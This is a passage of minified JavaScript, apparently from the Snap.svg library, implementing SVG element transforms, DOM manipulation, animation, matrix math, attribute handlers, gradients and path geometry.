t?(r.bboxwt=s?n.path.getBBox(e.realPath=s(e)):n._.box(e.node.getBBox()),n._.box(r.bboxwt)):(e.realPath=s(e),e.matrix=e.transform().localMatrix,r.bbox=n.path.getBBox(n.path.map(e.realPath,i.add(e.matrix))),n._.box(r.bbox))}catch(t){return n._.box()}};var x=function(){return this.string};u.transform=function(t){var e=this._;if(null==t){for(var i,o=this,r=new n.Matrix(this.node.getCTM()),s=l(this),a=[s],d=new n.Matrix,c=s.toTransformString(),u=p(s)==p(this.matrix)?p(e.transform):c;"svg"!=o.type&&(o=o.parent());)a.push(l(o));for(i=a.length;i--;)d.add(a[i]);return{string:u,globalMatrix:r,totalMatrix:d,localMatrix:s,diffMatrix:r.clone().add(s.invert()),global:r.toTransformString(),total:d.toTransformString(),local:c,toString:x}}return t instanceof n.Matrix?(this.matrix=t,this._.transform=t.toTransformString()):l(this,t),this.node&&("linearGradient"==this.type||"radialGradient"==this.type?g(this.node,{gradientTransform:this.matrix}):"pattern"==this.type?g(this.node,{patternTransform:this.matrix}):g(this.node,{transform:this.matrix})),this},u.parent=function(){return b(this.node.parentNode)},u.append=u.add=function(t){if(t){if("set"==t.type){var e=this;return t.forEach((function(t){e.add(t)})),this}t=b(t),this.node.appendChild(t.node),t.paper=this.paper}return this},u.appendTo=function(t){return t&&(t=b(t)).append(this),this},u.prepend=function(t){if(t){if("set"==t.type){var e,i=this;return t.forEach((function(t){e?e.after(t):i.prepend(t),e=t})),this}var n=(t=b(t)).parent();this.node.insertBefore(t.node,this.node.firstChild),this.add&&this.add(),t.paper=this.paper,this.parent()&&this.parent().add(),n&&n.add()}return this},u.prependTo=function(t){return(t=b(t)).prepend(this),this},u.before=function(t){if("set"==t.type){var e=this;return t.forEach((function(t){var i=t.parent();e.node.parentNode.insertBefore(t.node,e.node),i&&i.add()})),this.parent().add(),this}var i=(t=b(t)).parent();return this.node.parentNode.insertBefore(t.node,this.node),this.parent()&&this.parent().add(),i&&i.add(),t.paper=this.paper,this},u.after=function(t){var e=(t=b(t)).parent();return this.node.nextSibling?this.node.parentNode.insertBefore(t.node,this.node.nextSibling):this.node.parentNode.appendChild(t.node),this.parent()&&this.parent().add(),e&&e.add(),t.paper=this.paper,this},u.insertBefore=function(t){t=b(t);var e=this.parent();return t.node.parentNode.insertBefore(this.node,t.node),this.paper=t.paper,e&&e.add(),t.parent()&&t.parent().add(),this},u.insertAfter=function(t){t=b(t);var e=this.parent();return t.node.parentNode.insertBefore(this.node,t.node.nextSibling),this.paper=t.paper,e&&e.add(),t.parent()&&t.parent().add(),this},u.remove=function(){var t=this.parent();return this.node.parentNode&&this.node.parentNode.removeChild(this.node),delete this.paper,this.removed=!0,t&&t.add(),this},u.select=function(t){return b(this.node.querySelector(t))},u.selectAll=function(t){for(var e=this.node.querySelectorAll(t),i=(n.set||Array)(),o=0;o<e.length;o++)i.push(b(e[o]));return i},u.asPX=function(t,e){return null==e&&(e=this.attr(t)),+f(this,t,e)},u.use=function(){var t,e=this.node.id;return e||(e=this.id,g(this.node,{id:e})),t="linearGradient"==this.type||"radialGradient"==this.type||"pattern"==this.type?m(this.type,this.node.parentNode):m("use",this.node.parentNode),g(t.node,{"xlink:href":"#"+e}),t.original=this,t},u.clone=function(){var t=b(this.node.cloneNode(!0));return g(t.node,"id")&&g(t.node,{id:t.id}),function(t){function e(t,e){var i=g(t.node,e);(i=(i=i&&i.match(r))&&i[2])&&"#"==i.charAt()&&(i=i.substring(1))&&(a[i]=(a[i]||[]).concat((function(i){var n={};n[e]=URL(i),g(t.node,n)})))}function i(t){var e=g(t.node,"xlink:href");e&&"#"==e.charAt()&&(e=e.substring(1))&&(a[e]=(a[e]||[]).concat((function(e){t.attr("xlink:href","#"+e)})))}for(var n,o=t.selectAll("*"),r=/^\s*url\(("|'|)(.*)\1\)\s*$/,s=[],a={},l=0,d=o.length;d>l;l++){e(n=o[l],"fill"),e(n,"stroke"),e(n,"filter"),e(n,"mask"),e(n,"clip-path"),i(n);var c=g(n.node,"id");c&&(g(n.node,{id:n.id}),s.push({old:c,id:n.id}))}for(l=0,d=s.length;d>l;l++){var u=a[s[l].old];if(u)for(var h=0,p=u.length;p>h;h++)u[h](s[l].id)}}(t),t.insertAfter(this),t},u.toDefs=function(){return v(this).appendChild(this.node),this},u.pattern=u.toPattern=function(t,e,i,n){var o=m("pattern",v(this));return null==t&&(t=this.getBBox()),h(t,"object")&&"x"in t&&(e=t.y,i=t.width,n=t.height,t=t.x),g(o.node,{x:t,y:e,width:i,height:n,patternUnits:"userSpaceOnUse",id:o.id,viewBox:[t,e,i,n].join(" ")}),o.node.appendChild(this.node),o},u.marker=function(t,e,i,n,o,r){var s=m("marker",v(this));return null==t&&(t=this.getBBox()),h(t,"object")&&"x"in t&&(e=t.y,i=t.width,n=t.height,o=t.refX||t.cx,r=t.refY||t.cy,t=t.x),g(s.node,{viewBox:[t,e,i,n].join(" "),markerWidth:i,markerHeight:n,orient:"auto",refX:o||0,refY:r||0,id:s.id}),s.node.appendChild(this.node),s};var w=function(t,e,n,o){"function"!=typeof n||n.length||(o=n,n=i.linear),this.attr=t,this.dur=e,n&&(this.easing=n),o&&(this.callback=o)};n._.Animation=w,n.animation=function(t,e,i,n){return new w(t,e,i,n)},u.inAnim=function(){var t=this,e=[];for(var i in t.anims)t.anims[y](i)&&function(t){e.push({anim:new w(t._attrs,t.dur,t.easing,t._callback),mina:t,curStatus:t.status(),status:function(e){return t.status(e)},stop:function(){t.stop()}})}(t.anims[i]);return e},n.animate=function(t,n,o,r,s,a){"function"!=typeof s||s.length||(a=s,s=i.linear);var l=i.time(),d=i(t,n,l,l+r,i.time,o,s);return a&&e.once("mina.finish."+d.id,a),d},u.stop=function(){for(var t=this.inAnim(),e=0,i=t.length;i>e;e++)t[e].stop();return this},u.animate=function(t,n,o,r){"function"!=typeof o||o.length||(r=o,o=i.linear),t instanceof w&&(r=t.callback,o=t.easing,n=t.dur,t=t.attr);var s,a,l,c,u=[],f=[],g={},m=this;for(var v in t)if(t[y](v)){m.equal?(s=(c=m.equal(v,p(t[v]))).from,a=c.to,l=c.f):(s=+m.attr(v),a=+t[v]);var b=h(s,"array")?s.length:1;g[v]=d(u.length,u.length+b,l),u=u.concat(s),f=f.concat(a)}var x=i.time(),k=i(u,f,x,x+n,i.time,(function(t){var e={};for(var i in g)g[y](i)&&(e[i]=g[i](t));m.attr(e)}),o);return m.anims[k.id]=k,k._attrs=t,k._callback=r,e("snap.animcreated."+m.id,k),e.once("mina.finish."+k.id,(function(){delete m.anims[k.id],r&&r.call(m)})),e.once("mina.stop."+k.id,(function(){delete m.anims[k.id]})),m};var k={};u.data=function(t,i){var o=k[this.id]=k[this.id]||{};if(0==arguments.length)return e("snap.data.get."+this.id,this,o,null),o;if(1==arguments.length){if(n.is(t,"object")){for(var r in t)t[y](r)&&this.data(r,t[r]);return this}return e("snap.data.get."+this.id,this,o[t],t),o[t]}return o[t]=i,e("snap.data.set."+this.id,this,i,t),this},u.removeData=function(t){return null==t?k[this.id]={}:k[this.id]&&delete k[this.id][t],this},u.outerSVG=u.toString=c(1),u.innerSVG=c(),u.toDataURL=function(){if(t&&t.btoa){var e=this.getBBox(),i=n.format('<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="{width}" height="{height}" viewBox="{x} {y} {width} {height}">{contents}</svg>',{x:+e.x.toFixed(3),y:+e.y.toFixed(3),width:+e.width.toFixed(3),height:+e.height.toFixed(3),contents:this.outerSVG()});return"data:image/svg+xml;base64,"+btoa(unescape(encodeURIComponent(i)))}},a.prototype.select=u.select,a.prototype.selectAll=u.selectAll})),n.plugin((function(t){function e(t,e,n,o,r,s){return null==e&&"[object SVGMatrix]"==i.call(t)?(this.a=t.a,this.b=t.b,this.c=t.c,this.d=t.d,this.e=t.e,void(this.f=t.f)):void(null!=t?(this.a=+t,this.b=+e,this.c=+n,this.d=+o,this.e=+r,this.f=+s):(this.a=1,this.b=0,this.c=0,this.d=1,this.e=0,this.f=0))}var i=Object.prototype.toString,n=String,o=Math;!function(i){function r(t){return t[0]*t[0]+t[1]*t[1]}function s(t){var e=o.sqrt(r(t));t[0]&&(t[0]/=e),t[1]&&(t[1]/=e)}i.add=function(t,i,n,o,r,s){var a,l,d,c,u=[[],[],[]],h=[[this.a,this.c,this.e],[this.b,this.d,this.f],[0,0,1]],p=[[t,n,r],[i,o,s],[0,0,1]];for(t&&t instanceof e&&(p=[[t.a,t.c,t.e],[t.b,t.d,t.f],[0,0,1]]),a=0;3>a;a++)for(l=0;3>l;l++){for(c=0,d=0;3>d;d++)c+=h[a][d]*p[d][l];u[a][l]=c}return this.a=u[0][0],this.b=u[1][0],this.c=u[0][1],this.d=u[1][1],this.e=u[0][2],this.f=u[1][2],this},i.invert=function(){var t=this,i=t.a*t.d-t.b*t.c;return new e(t.d/i,-t.b/i,-t.c/i,t.a/i,(t.c*t.f-t.d*t.e)/i,(t.b*t.e-t.a*t.f)/i)},i.clone=function(){return new e(this.a,this.b,this.c,this.d,this.e,this.f)},i.translate=function(t,e){return this.add(1,0,0,1,t,e)},i.scale=function(t,e,i,n){return null==e&&(e=t),(i||n)&&this.add(1,0,0,1,i,n),this.add(t,0,0,e,0,0),(i||n)&&this.add(1,0,0,1,-i,-n),this},i.rotate=function(e,i,n){e=t.rad(e),i=i||0,n=n||0;var r=+o.cos(e).toFixed(9),s=+o.sin(e).toFixed(9);return this.add(r,s,-s,r,i,n),this.add(1,0,0,1,-i,-n)},i.x=function(t,e){return t*this.a+e*this.c+this.e},i.y=function(t,e){return t*this.b+e*this.d+this.f},i.get=function(t){return+this[n.fromCharCode(97+t)].toFixed(4)},i.toString=function(){return"matrix("+[this.get(0),this.get(1),this.get(2),this.get(3),this.get(4),this.get(5)].join()+")"},i.offset=function(){return[this.e.toFixed(4),this.f.toFixed(4)]},i.determinant=function(){return this.a*this.d-this.b*this.c},i.split=function(){var e={};e.dx=this.e,e.dy=this.f;var i=[[this.a,this.c],[this.b,this.d]];e.scalex=o.sqrt(r(i[0])),s(i[0]),e.shear=i[0][0]*i[1][0]+i[0][1]*i[1][1],i[1]=[i[1][0]-i[0][0]*e.shear,i[1][1]-i[0][1]*e.shear],e.scaley=o.sqrt(r(i[1])),s(i[1]),e.shear/=e.scaley,this.determinant()<0&&(e.scalex=-e.scalex);var n=-i[0][1],a=i[1][1];return 0>a?(e.rotate=t.deg(o.acos(a)),0>n&&(e.rotate=360-e.rotate)):e.rotate=t.deg(o.asin(n)),e.isSimple=!(+e.shear.toFixed(9)||e.scalex.toFixed(9)!=e.scaley.toFixed(9)&&e.rotate),e.isSuperSimple=!+e.shear.toFixed(9)&&e.scalex.toFixed(9)==e.scaley.toFixed(9)&&!e.rotate,e.noRotation=!+e.shear.toFixed(9)&&!e.rotate,e},i.toTransformString=function(t){var e=t||this.split();return+e.shear.toFixed(9)?"m"+[this.get(0),this.get(1),this.get(2),this.get(3),this.get(4),this.get(5)]:(e.scalex=+e.scalex.toFixed(4),e.scaley=+e.scaley.toFixed(4),e.rotate=+e.rotate.toFixed(4),(e.dx||e.dy?"t"+[+e.dx.toFixed(4),+e.dy.toFixed(4)]:"")+(1!=e.scalex||1!=e.scaley?"s"+[e.scalex,e.scaley,0,0]:"")+(e.rotate?"r"+[+e.rotate.toFixed(4),0,0]:""))}}(e.prototype),t.Matrix=e,t.matrix=function(t,i,n,o,r,s){return new e(t,i,n,o,r,s)}})),n.plugin((function(t,i,n,o,r){function s(n){return function(o){if(e.stop(),o instanceof r&&1==o.node.childNodes.length&&("radialGradient"==o.node.firstChild.tagName||"linearGradient"==o.node.firstChild.tagName||"pattern"==o.node.firstChild.tagName)&&(o=o.node.firstChild,h(this).appendChild(o),o=c(o)),o instanceof i)if("radialGradient"==o.type||"linearGradient"==o.type||"pattern"==o.type){o.node.id||f(o.node,{id:o.id});var s=g(o.node.id)}else s=o.attr(n);else if((s=t.color(o)).error){var a=t(h(this).ownerSVGElement).gradient(o);a?(a.node.id||f(a.node,{id:a.id}),s=g(a.node.id)):s=o}else s=m(s);var l={};l[n]=s,f(this.node,l),this.node.style[n]=y}}function a(t){e.stop(),t==+t&&(t+="px"),this.node.style.fontSize=t}function l(){return e.stop(),this.node.style.fontSize}var d=t._.make,c=t._.wrap,u=t.is,h=t._.getSomeDefs,p=/^url\(#?([^)]+)\)$/,f=t._.$,g=t.url,m=String,v=t._.separator,y="";e.on("snap.util.attr.mask",(function(t){if(t instanceof i||t instanceof r){if(e.stop(),t instanceof r&&1==t.node.childNodes.length&&(t=t.node.firstChild,h(this).appendChild(t),t=c(t)),"mask"==t.type)var n=t;else(n=d("mask",h(this))).node.appendChild(t.node);!n.node.id&&f(n.node,{id:n.id}),f(this.node,{mask:g(n.id)})}})),function(t){e.on("snap.util.attr.clip",t),e.on("snap.util.attr.clip-path",t),e.on("snap.util.attr.clipPath",t)}((function(t){if(t instanceof i||t instanceof r){if(e.stop(),"clipPath"==t.type)var n=t;else(n=d("clipPath",h(this))).node.appendChild(t.node),!n.node.id&&f(n.node,{id:n.id});f(this.node,{"clip-path":g(n.node.id||n.id)})}})),e.on("snap.util.attr.fill",s("fill")),e.on("snap.util.attr.stroke",s("stroke"));var b=/^([lr])(?:\(([^)]*)\))?(.*)$/i;e.on("snap.util.grad.parse",(function(t){var e=(t=m(t)).match(b);if(!e)return null;var i=e[1],n=e[2],o=e[3];return 1==(n=n.split(/\s*,\s*/).map((function(t){return+t==t?+t:t}))).length&&0==n[0]&&(n=[]),{type:i,params:n,stops:o=(o=o.split("-")).map((function(t){var e={color:(t=t.split(":"))[0]};return t[1]&&(e.offset=parseFloat(t[1])),e}))}})),e.on("snap.util.attr.d",(function(i){e.stop(),u(i,"array")&&u(i[0],"array")&&(i=t.path.toString.call(i)),(i=m(i)).match(/[ruo]/i)&&(i=t.path.toAbsolute(i)),f(this.node,{d:i})}))(-1),e.on("snap.util.attr.#text",(function(t){e.stop(),t=m(t);for(var i=o.doc.createTextNode(t);this.node.firstChild;)this.node.removeChild(this.node.firstChild);this.node.appendChild(i)}))(-1),e.on("snap.util.attr.path",(function(t){e.stop(),this.attr({d:t})}))(-1),e.on("snap.util.attr.class",(function(t){e.stop(),this.node.className.baseVal=t}))(-1),e.on("snap.util.attr.viewBox",(function(t){var i;i=u(t,"object")&&"x"in t?[t.x,t.y,t.width,t.height].join(" "):u(t,"array")?t.join(" "):t,f(this.node,{viewBox:i}),e.stop()}))(-1),e.on("snap.util.attr.transform",(function(t){this.transform(t),e.stop()}))(-1),e.on("snap.util.attr.r",(function(t){"rect"==this.type&&(e.stop(),f(this.node,{rx:t,ry:t}))}))(-1),e.on("snap.util.attr.textpath",(function(t){if(e.stop(),"text"==this.type){var n,o,r;if(!t&&this.textPath){for(o=this.textPath;o.node.firstChild;)this.node.appendChild(o.node.firstChild);return o.remove(),void delete this.textPath}if(u(t,"string")){var s=h(this),a=c(s.parentNode).path(t);s.appendChild(a.node),n=a.id,a.attr({id:n})}else(t=c(t))instanceof i&&((n=t.attr("id"))||(n=t.id,t.attr({id:n})));if(n)if(o=this.textPath,r=this.node,o)o.attr({"xlink:href":"#"+n});else{for(o=f("textPath",{"xlink:href":"#"+n});r.firstChild;)o.appendChild(r.firstChild);r.appendChild(o),this.textPath=c(o)}}}))(-1),e.on("snap.util.attr.text",(function(t){if("text"==this.type){for(var i=this.node,n=function(t){var e=f("tspan");if(u(t,"array"))for(var i=0;i<t.length;i++)e.appendChild(n(t[i]));else e.appendChild(o.doc.createTextNode(t));return e.normalize&&e.normalize(),e};i.firstChild;)i.removeChild(i.firstChild);for(var r=n(t);r.firstChild;)i.appendChild(r.firstChild)}e.stop()}))(-1),e.on("snap.util.attr.fontSize",a)(-1),e.on("snap.util.attr.font-size",a)(-1),e.on("snap.util.getattr.transform",(function(){return e.stop(),this.transform()}))(-1),e.on("snap.util.getattr.textpath",(function(){return e.stop(),this.textPath}))(-1),function(){function i(i){return function(){e.stop();var n=o.doc.defaultView.getComputedStyle(this.node,null).getPropertyValue("marker-"+i);return"none"==n?n:t(o.doc.getElementById(n.match(p)[1]))}}function n(t){return function(i){e.stop();var n="marker"+t.charAt(0).toUpperCase()+t.substring(1);if(""!=i&&i){if("marker"==i.type){var o=i.node.id;return o||f(i.node,{id:i.id}),void(this.node.style[n]=g(o))}}else this.node.style[n]="none"}}e.on("snap.util.getattr.marker-end",i("end"))(-1),e.on("snap.util.getattr.markerEnd",i("end"))(-1),e.on("snap.util.getattr.marker-start",i("start"))(-1),e.on("snap.util.getattr.markerStart",i("start"))(-1),e.on("snap.util.getattr.marker-mid",i("mid"))(-1),e.on("snap.util.getattr.markerMid",i("mid"))(-1),e.on("snap.util.attr.marker-end",n("end"))(-1),e.on("snap.util.attr.markerEnd",n("end"))(-1),e.on("snap.util.attr.marker-start",n("start"))(-1),e.on("snap.util.attr.markerStart",n("start"))(-1),e.on("snap.util.attr.marker-mid",n("mid"))(-1),e.on("snap.util.attr.markerMid",n("mid"))(-1)}(),e.on("snap.util.getattr.r",(function(){return"rect"==this.type&&f(this.node,"rx")==f(this.node,"ry")?(e.stop(),f(this.node,"rx")):void 0}))(-1),e.on("snap.util.getattr.text",(function(){if("text"==this.type||"tspan"==this.type){e.stop();var t=function t(e){for(var i=[],n=e.childNodes,o=0,r=n.length;r>o;o++){var s=n[o];3==s.nodeType&&i.push(s.nodeValue),"tspan"==s.tagName&&i.push(1==s.childNodes.length&&3==s.firstChild.nodeType?s.firstChild.nodeValue:t(s))}return i}(this.node);return 1==t.length?t[0]:t}}))(-1),e.on("snap.util.getattr.#text",(function(){return this.node.textContent}))(-1),e.on("snap.util.getattr.viewBox",(function(){e.stop();var i=f(this.node,"viewBox");return i?(i=i.split(v),t._.box(+i[0],+i[1],+i[2],+i[3])):void 0}))(-1),e.on("snap.util.getattr.points",(function(){var t=f(this.node,"points");return e.stop(),t?t.split(v):void 0}))(-1),e.on("snap.util.getattr.path",(function(){var t=f(this.node,"d");return e.stop(),t}))(-1),e.on("snap.util.getattr.class",(function(){return this.node.className.baseVal}))(-1),e.on("snap.util.getattr.fontSize",l)(-1),e.on("snap.util.getattr.font-size",l)(-1)})),n.plugin((function(t,e){var i=/\S+/g,n=String,o=e.prototype;o.addClass=function(t){var e,o,r,s=n(t||"").match(i)||[],a=this.node,l=a.className.baseVal,d=l.match(i)||[];if(s.length){for(e=0;o=s[e++];)~d.indexOf(o)||d.push(o);l!=(r=d.join(" "))&&(a.className.baseVal=r)}return this},o.removeClass=function(t){var e,o,r,s,a=n(t||"").match(i)||[],l=this.node,d=l.className.baseVal,c=d.match(i)||[];if(c.length){for(e=0;r=a[e++];)~(o=c.indexOf(r))&&c.splice(o,1);d!=(s=c.join(" "))&&(l.className.baseVal=s)}return this},o.hasClass=function(t){return!!~(this.node.className.baseVal.match(i)||[]).indexOf(t)},o.toggleClass=function(t,e){if(null!=e)return e?this.addClass(t):this.removeClass(t);var n,o,r,s,a=(t||"").match(i)||[],l=this.node,d=l.className.baseVal,c=d.match(i)||[];for(n=0;r=a[n++];)~(o=c.indexOf(r))?c.splice(o,1):c.push(r);return d!=(s=c.join(" "))&&(l.className.baseVal=s),this}})),n.plugin((function(){function t(t){return t}function i(t){return function(e){return+e.toFixed(3)+t}}var n={"+":function(t,e){return t+e},"-":function(t,e){return t-e},"/":function(t,e){return t/e},"*":function(t,e){return t*e}},o=String,r=/[a-z]+$/i,s=/^\s*([+\-\/*])\s*=\s*([\d.eE+\-]+)\s*([^\d\s]+)?\s*$/;e.on("snap.util.attr",(function(t){var i=o(t).match(s);if(i){var a=e.nt(),l=a.substring(a.lastIndexOf(".")+1),d=this.attr(l),c={};e.stop();var u=i[3]||"",h=d.match(r),p=n[i[1]];if(h&&h==u?t=p(parseFloat(d),+i[2]):(d=this.asPX(l),t=p(this.asPX(l),this.asPX(l,i[2]+u))),isNaN(d)||isNaN(t))return;c[l]=t,this.attr(c)}}))(-10),e.on("snap.util.equal",(function(a,l){var d=o(this.attr(a)||""),c=o(l).match(s);if(c){e.stop();var u=c[3]||"",h=d.match(r),p=n[c[1]];return h&&h==u?{from:parseFloat(d),to:p(parseFloat(d),+c[2]),f:i(h)}:{from:d=this.asPX(a),to:p(d,this.asPX(a,c[2]+u)),f:t}}}))(-10)})),n.plugin((function(i,n,o,r){var s=o.prototype,a=i.is;s.rect=function(t,e,i,n,o,r){var s;return null==r&&(r=o),a(t,"object")&&"[object Object]"==t?s=t:null!=t&&(s={x:t,y:e,width:i,height:n},null!=o&&(s.rx=o,s.ry=r)),this.el("rect",s)},s.circle=function(t,e,i){var n;return a(t,"object")&&"[object Object]"==t?n=t:null!=t&&(n={cx:t,cy:e,r:i}),this.el("circle",n)};var l=function(){function t(){this.parentNode.removeChild(this)}return function(e,i){var n=r.doc.createElement("img"),o=r.doc.body;n.style.cssText="position:absolute;left:-9999em;top:-9999em",n.onload=function(){i.call(n),n.onload=n.onerror=null,o.removeChild(n)},n.onerror=t,o.appendChild(n),n.src=e}}();s.image=function(t,e,n,o,r){var s=this.el("image");if(a(t,"object")&&"src"in t)s.attr(t);else if(null!=t){var d={"xlink:href":t,preserveAspectRatio:"none"};null!=e&&null!=n&&(d.x=e,d.y=n),null!=o&&null!=r?(d.width=o,d.height=r):l(t,(function(){i._.$(s.node,{width:this.offsetWidth,height:this.offsetHeight})})),i._.$(s.node,d)}return s},s.ellipse=function(t,e,i,n){var o;return a(t,"object")&&"[object Object]"==t?o=t:null!=t&&(o={cx:t,cy:e,rx:i,ry:n}),this.el("ellipse",o)},s.path=function(t){var e;return a(t,"object")&&!a(t,"array")?e=t:t&&(e={d:t}),this.el("path",e)},s.group=s.g=function(t){var e=this.el("g");return 1==arguments.length&&t&&!t.type?e.attr(t):arguments.length&&e.add(Array.prototype.slice.call(arguments,0)),e},s.svg=function(t,e,i,n,o,r,s,l){var d={};return a(t,"object")&&null==e?d=t:(null!=t&&(d.x=t),null!=e&&(d.y=e),null!=i&&(d.width=i),null!=n&&(d.height=n),null!=o&&null!=r&&null!=s&&null!=l&&(d.viewBox=[o,r,s,l])),this.el("svg",d)},s.mask=function(t){var e=this.el("mask");return 1==arguments.length&&t&&!t.type?e.attr(t):arguments.length&&e.add(Array.prototype.slice.call(arguments,0)),e},s.ptrn=function(t,e,i,n,o,r,s,l){if(a(t,"object"))var d=t;else d={patternUnits:"userSpaceOnUse"},t&&(d.x=t),e&&(d.y=e),null!=i&&(d.width=i),null!=n&&(d.height=n),d.viewBox=null!=o&&null!=r&&null!=s&&null!=l?[o,r,s,l]:[t||0,e||0,i||0,n||0];return this.el("pattern",d)},s.use=function(t){return null!=t?(t instanceof n&&(t.attr("id")||t.attr({id:i._.id(t)}),t=t.attr("id")),"#"==String(t).charAt()&&(t=t.substring(1)),this.el("use",{"xlink:href":"#"+t})):n.prototype.use.call(this)},s.symbol=function(t,e,i,n){var o={};return null!=t&&null!=e&&null!=i&&null!=n&&(o.viewBox=[t,e,i,n]),this.el("symbol",o)},s.text=function(t,e,i){var n={};return a(t,"object")?n=t:null!=t&&(n={x:t,y:e,text:i||""}),this.el("text",n)},s.line=function(t,e,i,n){var o={};return a(t,"object")?o=t:null!=t&&(o={x1:t,x2:i,y1:e,y2:n}),this.el("line",o)},s.polyline=function(t){arguments.length>1&&(t=Array.prototype.slice.call(arguments,0));var e={};return a(t,"object")&&!a(t,"array")?e=t:null!=t&&(e={points:t}),this.el("polyline",e)},s.polygon=function(t){arguments.length>1&&(t=Array.prototype.slice.call(arguments,0));var e={};return a(t,"object")&&!a(t,"array")?e=t:null!=t&&(e={points:t}),this.el("polygon",e)},function(){function n(){return this.selectAll("stop")}function o(t,e){var n=d("stop"),o={offset:+e+"%"};return t=i.color(t),o["stop-color"]=t.hex,t.opacity<1&&(o["stop-opacity"]=t.opacity),d(n,o),this.node.appendChild(n),this}function r(){if("linearGradient"==this.type){var t=d(this.node,"x1")||0,e=d(this.node,"x2")||1,n=d(this.node,"y1")||0,o=d(this.node,"y2")||0;return i._.box(t,n,math.abs(e-t),math.abs(o-n))}var r=this.node.cx||.5,s=this.node.cy||.5,a=this.node.r||0;return i._.box(r-a,s-a,2*a,2*a)}function a(t,e,s,a,l){var c=i._.make("linearGradient",t);return c.stops=n,c.addStop=o,c.getBBox=r,null!=e&&d(c.node,{x1:e,y1:s,x2:a,y2:l}),c}function l(t,e,s,a,l,c){var u=i._.make("radialGradient",t);return u.stops=n,u.addStop=o,u.getBBox=r,null!=e&&d(u.node,{cx:e,cy:s,r:a}),null!=l&&null!=c&&d(u.node,{fx:l,fy:c}),u}var d=i._.$;s.gradient=function(t){return function(t,i){function n(t,e){for(var i=(e-u)/(t-h),n=h;t>n;n++)s[n].offset=+(+u+i*(n-h)).toFixed(2);h=t,u=e}var o,r=e("snap.util.grad.parse",null,i).firstDefined();if(!r)return null;r.params.unshift(t),o="l"==r.type.toLowerCase()?a.apply(0,r.params):l.apply(0,r.params),r.type!=r.type.toLowerCase()&&d(o.node,{gradientUnits:"userSpaceOnUse"});var s=r.stops,c=s.length,u=0,h=0;c--;for(var p=0;c>p;p++)"offset"in s[p]&&n(p,s[p].offset);for(s[c].offset=s[c].offset||100,n(c,s[c].offset),p=0;c>=p;p++){var f=s[p];o.addStop(f.color,f.offset)}return o}(this.defs,t)},s.gradientLinear=function(t,e,i,n){return a(this.defs,t,e,i,n)},s.gradientRadial=function(t,e,i,n,o){return l(this.defs,t,e,i,n,o)},s.toString=function(){var t,e=this.node.ownerDocument,n=e.createDocumentFragment(),o=e.createElement("div"),r=this.node.cloneNode(!0);return n.appendChild(o),o.appendChild(r),i._.$(r,{xmlns:"http://www.w3.org/2000/svg"}),t=o.innerHTML,n.removeChild(n.firstChild),t},s.toDataURL=function(){return t&&t.btoa?"data:image/svg+xml;base64,"+btoa(unescape(encodeURIComponent(this))):void 0},s.clear=function(){for(var t,e=this.node.firstChild;e;)t=e.nextSibling,"defs"!=e.tagName?e.parentNode.removeChild(e):s.clear.call({node:e}),e=t}}()})),n.plugin((function(t,e){function i(t){var e=i.ps=i.ps||{};return e[t]?e[t].sleep=100:e[t]={sleep:100},setTimeout((function(){for(var i in e)e[M](i)&&i!=t&&(e[i].sleep--,!e[i].sleep&&delete e[i])})),e[t]}function n(t,e,i,n){return null==t&&(t=e=i=n=0),null==e&&(e=t.y,i=t.width,n=t.height,t=t.x),{x:t,y:e,width:i,w:i,height:n,h:n,x2:t+i,y2:e+n,cx:t+i/2,cy:e+n/2,r1:L.min(i,n)/2,r2:L.max(i,n)/2,r0:L.sqrt(i*i+n*n)/2,path:y(t,e,i,n),vb:[t,e,i,n].join(" ")}}function o(){return this.join(",").replace(A,"$1")}function r(t){var e=I(t);return e.toString=o,e}function s(t,e,i,n,o,r,s,a,d){return null==d?p(t,e,i,n,o,r,s,a):l(t,e,i,n,o,r,s,a,function(t,e,i,n,o,r,s,a,l){if(!(0>l||p(t,e,i,n,o,r,s,a)<l)){var d,c=.5,u=1-c;for(d=p(t,e,i,n,o,r,s,a,u);B(d-l)>.01;)d=p(t,e,i,n,o,r,s,a,u+=(l>d?1:-1)*(c/=2));return u}}(t,e,i,n,o,r,s,a,d))}function a(i,n){function o(t){return+(+t).toFixed(3)}return t._.cacher((function(t,r,a){t instanceof e&&(t=t.attr("d"));for(var d,c,u,h,p,f="",g={},m=0,v=0,y=(t=S(t)).length;y>v;v++){if("M"==(u=t[v])[0])d=+u[1],c=+u[2];else{if(m+(h=s(d,c,u[1],u[2],u[3],u[4],u[5],u[6]))>r){if(n&&!g.start){if(f+=["C"+o((p=s(d,c,u[1],u[2],u[3],u[4],u[5],u[6],r-m)).start.x),o(p.start.y),o(p.m.x),o(p.m.y),o(p.x),o(p.y)],a)return f;g.start=f,f=["M"+o(p.x),o(p.y)+"C"+o(p.n.x),o(p.n.y),o(p.end.x),o(p.end.y),o(u[5]),o(u[6])].join(),m+=h,d=+u[5],c=+u[6];continue}if(!i&&!n)return s(d,c,u[1],u[2],u[3],u[4],u[5],u[6],r-m)}m+=h,d=+u[5],c=+u[6]}f+=u.shift()+u}return g.end=f,i?m:n?g:l(d,c,u[0],u[1],u[2],u[3],u[4],u[5],1)}),null,t._.clone)}function l(t,e,i,n,o,r,s,a,l){var d=1-l,c=N(d,3),u=N(d,2),h=l*l,p=h*l,f=t+2*l*(i-t)+h*(o-2*i+t),g=e+2*l*(n-e)+h*(r-2*n+e),m=i+2*l*(o-i)+h*(s-2*o+i),v=n+2*l*(r-n)+h*(a-2*r+n);return{x:c*t+3*u*l*i+3*d*l*l*o+p*s,y:c*e+3*u*l*n+3*d*l*l*r+p*a,m:{x:f,y:g},n:{x:m,y:v},start:{x:d*t+l*i,y:d*e+l*n},end:{x:d*o+l*s,y:d*r+l*a},alpha:90-180*L.atan2(f-m,g-v)/E}}function d(e,i,o,r,s,a,l,d){t.is(e,"array")||(e=[e,i,o,r,s,a,l,d]);var c=C.apply(null,e);return n(c.min.x,c.min.y,c.max.x-c.min.x,c.max.y-c.min.y)}function c(t,e,i){return e>=t.x&&e<=t.x+t.width&&i>=t.y&&i<=t.y+t.height}function u(t,e){return t=n(t),c(e=n(e),t.x,t.y)||c(e,t.x2,t.y)||c(e,t.x,t.y2)||c(e,t.x2,t.y2)||c(t,e.x,e.y)||c(t,e.x2,e.y)||c(t,e.x,e.y2)||c(t,e.x2,e.y2)||(t.x<e.x2&&t.x>e.x||e.x<t.x2&&e.x>t.x)&&(t.y<e.y2&&t.y>e.y||e.y<t.y2&&e.y>t.y)}function h(t,e,i,n,o){return t*(t*(-3*e+9*i-9*n+3*o)+6*e-12*i+6*n)-3*e+3*i}function 